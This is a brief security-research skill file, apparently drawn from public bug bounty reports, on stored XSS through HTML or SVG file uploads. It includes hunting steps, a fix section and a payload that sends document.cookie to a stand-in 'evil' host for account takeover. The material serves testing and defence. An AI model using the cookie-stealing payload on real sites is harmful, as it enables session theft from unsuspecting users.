---
name: upload-stored-xss
description: Arbitrary file upload → stored XSS via HTML/SVG served inline. Teaches XSS-through-upload when the server serves attacker files with a browser-rendered content type.
sources: hackerone_public
report_count: 2
---

# File Upload → Stored XSS

**Reports**: Visma — "Unrestricted file upload → stored XSS" (#808862, $250) and "Arbitrary File Upload → Stored XSS" (#808821, $250). See also TikTok #1433125.

## Why it matters (the new lesson)
Even when the uploader blocks `php`, an `.html`/`.svg`/`.htm`/`.xml` file served back with `Content-Type: text/html` (or no `X-Content-Type-Options`) executes script in the victim's origin → stored XSS, often via an upload feature nobody associates with XSS.

## How it works
```
Upload: xss.html  →  served at https://target/uploads/xss.html
Content: <script>document.location='//evil/?c='+document.cookie</script>
```

## How to hunt for it
1. Upload `.html`, `.svg`, `.htm`, `.xml`, `.xhtml`.
2. Fetch the file URL; check the `Content-Type` and whether JS runs.
3. If served as `text/plain`/`octet-stream`, try MIME sniffing tricks (polyglot, `.svg`).
4. Chain: if same-origin, steal cookies → ATO.

## Payloads
```html
<script>alert(document.domain)</script>
<svg onload=alert(document.domain)>
```

## Fix
Serve uploads with `Content-Disposition: attachment` + `nosniff`; sanitize/sandbox; separate upload origin; CSP.
